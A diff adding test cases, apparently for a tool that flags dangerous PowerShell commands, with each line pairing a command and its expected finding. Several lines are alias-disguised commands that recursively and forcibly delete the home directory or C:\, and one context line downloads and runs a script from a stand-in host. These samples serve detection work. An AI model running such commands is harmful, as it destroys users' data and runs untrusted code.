@@ -206,6 +206,13 @@ powershell finds=delete | Set-Alias x Start-Process; x cmd -ArgumentList '/c rd 
 powershell finds=unknown | Set-Alias x Invoke-Command; x -ScriptBlock $b
 powershell finds=unknown | Set-Alias x Register-EngineEvent; x PowerShell.Exiting -Action $b
 powershell finds=run_downloaded | Set-Alias x iex; x (iwr https://x.example/a.ps1)
+powershell finds=delete | Set-Alias x Set-PSBreakpoint; x -Variable y -Action { Remove-Item -Recurse -Force ~ }
+powershell finds=delete | Set-Alias x Start-ThreadJob; x { Remove-Item -Recurse -Force ~ }
+powershell finds=delete | Set-Alias x cmd; x --% /c rd /s /q C:\\
+# A job's block is read apart from the session only when every command the
+# name may run starts one: here `x` may be its own program, which runs the
+# block in the session, so the `cd` may move the line.
+powershell finds=delete | Set-Alias x Start-Job; x { cd ~ }; Remove-Item -Recurse -Force *
 powershell finds=delete | Set-Item Alias:x Remove-Item; x -Recurse -Force ~
 powershell finds=delete | Set-Item -Path Alias:\\x -Value Remove-Item; x -Recurse -Force ~
 powershell finds=delete | si alias:x Remove-Item; x -Recurse -Force ~
